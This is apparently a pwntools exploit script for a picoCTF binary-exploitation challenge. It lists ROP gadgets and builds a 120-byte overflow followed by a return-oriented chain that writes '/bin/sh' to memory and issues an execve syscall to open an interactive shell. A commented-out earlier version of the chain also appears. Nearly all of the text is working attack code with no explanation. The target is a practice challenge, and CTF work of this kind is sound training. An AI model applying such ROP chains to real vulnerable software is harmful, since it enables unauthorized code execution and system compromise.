from pwn import *

binary = context.binary =ELF("./vuln")


if args.REMOTE:
    r = remote("jupiter.challenges.picoctf.org", 26735)
else:
    r = process([binary.path])
    gdb.attach(r, api=True)

payload = b""

'''
0x0000000000400696 : pop rdi ; ret
0x0000000000410ca3 : pop rsi ; ret
0x000000000044cc26 : pop rdx ; ret
0x0000000000436393 : mov qword ptr [rdi], rdx ; ret
0x000000000047ff91 : mov qword ptr [rsi], rax ; ret
0x000000000044cc26 : pop rdx ; ret
0x000000000040137c : syscall
0x0000000000400416 : ret
0x00000000004163f4 : pop rax ; ret
0x0000000000445950 : xor rax, rax ; ret
'''
r.sendline(b"84")
r.recv()

# payload += b"a"*120
# payload += p64(0x0000000000410ca3) #pop rsi
# payload += p64(0x6b7020) #addr
# payload += p64(0x00000000004163f4) #pop rax
# payload += b"/bin/sh\x00"
# payload += p64(0x000000000047ff91) #mov...
# payload += p64(0x000000000044cc26) #pop rdx
# payload += p64(0)
# payload += p64(0x0000000000410ca3) #pop rsi
# payload += p64(0)
# payload += p64(0x00000000004163f4) #pop rax
# payload += p64(0x3b)
# payload += p64(0x0000000000400696) #pop rdi
# payload += p64(0x6b7020) #addr
# payload += p64(0x0000000000400416) #ret
# payload += p64(0x000000000040137c) #syscall

payload += b"a"*120
payload += p64(0x0000000000400696) #pop rdi
payload += p64(0x6b7020) #addr
payload += p64(0x000000000044cc26) #pop rdx
payload += b"/bin/sh\x00"
payload += p64(0x0000000000436393) #mov...
payload += p64(0x000000000044cc26) #pop rdx
payload += p64(0)
payload += p64(0x0000000000410ca3) #pop rsi
payload += p64(0)
payload += p64(0x00000000004163f4) #pop rax
payload += p64(0x3b)
payload += p64(0x0000000000400416) #ret
payload += p64(0x000000000040137c) #syscall

r.sendline(payload)
r.interactive()